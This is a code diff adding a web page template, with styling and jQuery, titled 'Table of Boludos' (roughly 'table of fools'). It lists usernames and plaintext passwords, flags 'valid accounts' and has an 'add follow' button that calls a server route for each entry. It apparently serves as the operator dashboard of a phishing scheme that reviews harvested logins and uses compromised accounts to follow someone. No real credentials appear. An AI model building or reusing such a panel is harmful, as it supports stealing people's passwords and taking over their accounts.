@@ -1,0 +1,271 @@
+<div id="wrapper">
+  <h1>Table of Boludos</h1>
+  <input type="checkbox" id="switch" /><label for="switch">Toggle</label>
+  <input type="checkbox" id="switch2" /><label class="left" for="switch2">Toggle</label>
+  
+  <table id="keywords" cellspacing="0" cellpadding="0">
+    <thead>
+      <tr>
+        <th><span>USUARIO</span></th>
+        <th><span>PASSWORD</span></th>
+        <th><span>R</span></th>
+        <th><span>FOLLOW</span></th>
+      </tr>
+    </thead>
+    <tbody>
+      {{#each boludos}}
+         <tr  class="{{#if this.valida}} cuenta_valida {{/if}}{{#if this.follow}} follow none{{else}} nofollow{{/if}} ">
+          <td >{{this.name}}</td>
+          <td>{{this.pass}}</td>
+          <td>{{#if this.repetido}}{{this.repetido}}{{else}}-{{/if}}</td>
+          {{#if this.follow}}
+          <td class="" ><img src="/img/follow.png" alt=""></td>
+          {{else}}
+          <td class="addfollow" data-id={{this._id}}><img src="/img/add-friend.png" alt=""></td>
+          {{/if}}
+        </tr> 
+      {{/each}}
+     
+      
+    </tbody>
+  </table>
+</div> 
+
+
+
+<style>
+  @import url('https://fonts.googleapis.com/css?family=Amarante');
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+  font-size: 100%;
+  font: inherit;
+  vertical-align: baseline;
+  outline: none;
+  -webkit-font-smoothing: antialiased;
+  -webkit-text-size-adjust: 100%;
+  -ms-text-size-adjust: 100%;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+html { overflow-y: scroll; }
+body { 
+  background: #eee url('https://i.imgur.com/eeQeRmk.png'); /* https://subtlepatterns.com/weave/ */
+  font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+  font-size: 62.5%;
+  line-height: 1;
+  color: #585858;
+  padding: 22px 10px;
+  padding-bottom: 55px;
+}
+
+::selection { background: #5f74a0; color: #fff; }
+::-moz-selection { background: #5f74a0; color: #fff; }
+::-webkit-selection { background: #5f74a0; color: #fff; }
+
+br { display: block; line-height: 1.6em; } 
+
+article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section { display: block; }
+ol, ul { list-style: none; }
+
+input, textarea { 
+  -webkit-font-smoothing: antialiased;
+  -webkit-text-size-adjust: 100%;
+  -ms-text-size-adjust: 100%;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+  outline: none; 
+}
+
+blockquote, q { quotes: none; }
+blockquote:before, blockquote:after, q:before, q:after { content: ''; content: none; }
+strong, b { font-weight: bold; } 
+
+table { border-collapse: collapse; border-spacing: 0; }
+img { border: 0; max-width: 100%; }
+
+h1 { 
+  font-family: 'Amarante', Tahoma, sans-serif;
+  font-weight: bold;
+  font-size: 3.6em;
+  line-height: 1.7em;
+  margin-bottom: 10px;
+  text-align: center;
+}
+
+
+/** page structure **/
+#wrapper {
+  display: block;
+  width: 100%;
+  max-width: 850px;
+  background: #fff;
+  margin: 0 auto;
+  padding: 10px 17px;
+  -webkit-box-shadow: 2px 2px 3px -1px rgba(0,0,0,0.35);
+  position: relative;
+}
+
+
+.hide{
+  display: none;
+}
+.show-force.cuenta_valida{
+  background: #f93a39 !important;
+  color: white !important;
+  border-bottom: 2px solid white;
+}
+
+#keywords {
+  margin: 0 auto;
+ font-size: 20px;
+  margin-bottom: 15px;
+  width: 100%;
+}
+
+
+#keywords thead {
+  background: #c9dff0;
+}
+
+#keywords thead tr th span { 
+  padding: 0 5px;
+  background-repeat: no-repeat;
+  background-position: 100% 100%;
+}
+#keywords thead tr th {
+    font-weight: bold;
+    padding: 13px 0px;
+    font-size: 16px;
+    /* padding-left: 42px; */
+}
+#keywords thead tr th.headerSortUp, #keywords thead tr th.headerSortDown {
+  background: #acc8dd;
+}
+
+
+#keywords tbody  tr:nth-child(odd) {background: #ececec;}
+
+#keywords tbody tr td img {
+    width: 15px;
+    cursor: pointer;
+}
+#keywords tbody tr { 
+  color: #555;
+}
+#keywords tbody tr td {
+  text-align: center;
+  padding: 15px 10px;
+}
+#keywords tbody tr td.lalign {
+  text-align: left;
+}
+
+input[type=checkbox]{
+  height: 0;
+  width: 0;
+  visibility: hidden;
+}
+
+label {
+      cursor: pointer;
+    text-indent: -9999px;
+    width: 80px;
+    height: 40px;
+    background: grey;
+    display: block;
+    border-radius: 100px;
+        position: absolute;
+    right: 8px;
+    top: 8px;
+}
+
+
+label.left{
+  right: inherit;
+}
+
+label:after {
+  content: '';
+  position: absolute;
+  top: 5px;
+  left: 5px;
+  width: 35px;
+  height: 29px;
+  background: #fff;
+  border-radius: 90px;
+  transition: 0.3s;
+}
+
+input:checked + label {
+  background: #bada55;
+}
+
+
+input:checked + label.left {
+    background: #f93a3a;
+}
+
+input:checked + label:after {
+  left: calc(100% - 5px);
+  transform: translateX(-100%);
+}
+
+label:active:after {
+  width: 130px;
+}
+
+
+@media (max-width: 600px) {
+    #keywords tbody tr td {
+        font-size: 12px;
+    }
+    #wrapper {
+      padding-top: 60px;
+    }
+    label {
+      top: 15px;
+    }
+
+
+
+}
+</style>
+
+
+
+<script>
+  $(document).ready(function() {
+      $("td.addfollow").click(function(event){
+          event.preventDefault();
+          var ide= $(this).attr("data-id")
+          $.ajax({
+              url: '/add_follow/'+ide,
+              type: 'GET',
+          }).done(function(res) {
+            location.reload();
+          })
+      });
+
+      $('#switch').click(function() {
+          if (!$(this).is(':checked')) {
+            $(".nofollow").removeClass("hide")
+
+          }else{
+              $(".nofollow").addClass("hide")
+          }
+      });
+      $('#switch2').click(function() {
+          if (!$(this).is(':checked')) {
+            $(".cuenta_valida").removeClass("show-force")
+
+          }else{
+              $(".cuenta_valida").addClass("show-force")
+          }
+      });
+  })
+</script>
